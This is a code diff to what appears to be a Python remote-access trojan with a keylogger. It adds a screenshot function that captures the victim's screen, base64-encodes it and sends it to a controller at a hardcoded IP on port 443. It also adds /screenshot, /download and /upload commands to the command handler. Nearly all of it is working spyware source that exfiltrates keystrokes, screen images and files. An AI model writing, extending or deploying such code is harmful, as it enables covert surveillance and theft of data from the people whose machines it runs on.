@@ -5,15 +5,25 @@ import subprocess
 import shutil
 import sys
 import base64
+import io 
 
+try:
+    from PIL import ImageGrab
+except Exception:
+    # Fall back to pyscreenshot if Pillow is not available (helps environments
+    # where PIL cannot be resolved). If neither is available, ImageGrab will
+    # be None and callers should handle that case.
+    try:
+        from pyscreenshot import grab as ImageGrab  # type: ignore
+    except Exception:
+        ImageGrab = None
 from pathlib import Path
 from collections.abc import MutableSequence
 from time import sleep
-from pynput import keyboard
+from pynput import keyboard # type: ignore
 
-IP = ""
+IP = "192.168.56.1"
 PORT = 443
-
 MAX_BUFFER_SIZE = 500
 
 class keylog_buffer(MutableSequence):
@@ -51,6 +61,28 @@ class keylog_buffer(MutableSequence):
         for item in iterable:
             self.append(item)
 
+
+def take_screenshot(c):
+    try:
+        img = ImageGrab.grab()
+        buf = io.BytesIO()
+        img.save(buf, format="PNG")
+        raw_bytes = buf.getvalue()
+
+        encoded = base64.b64encode(raw_bytes).decode('utf-8')
+
+        header = (
+            f"[+] Screenshot captured\n"
+            f"[+] Filename: screenshot.png\n"
+            f"[+] Size: {len(raw_bytes)} bytes\n"
+            f"[FILE_START]"
+        )
+        c.send(header.encode())
+        c.send(encoded.encode())
+        c.send(b"\n[FILE_END]\n\n")
+
+    except Exception as e:
+        c.send(f"[-] Screenshot failed: {e}\n\n".encode())
 
 def download_file(filepath):
     try:
@@ -251,7 +283,11 @@ def cmd(c, data):
             c.send(status.encode() + b"\n\n")
             return
 
-        elif data.startswith("/download "):
+        elif data == "/screenshot":
+            take_screenshot(c)
+            return
+
+        elif data.startswith("/download"):
             filepath = data[10:].strip()
             c.send(b"[i] Preparing file for download...\n")
 
@@ -272,7 +308,7 @@ def cmd(c, data):
                 c.send(f"[-] Download failed: {result['error']}\n\n".encode())
             return
 
-        elif data.startswith("/upload "):
+        elif data.startswith("/upload"):
             filepath = data[8:].strip()
             c.send(b"[i] Ready to receive file.\n")
 
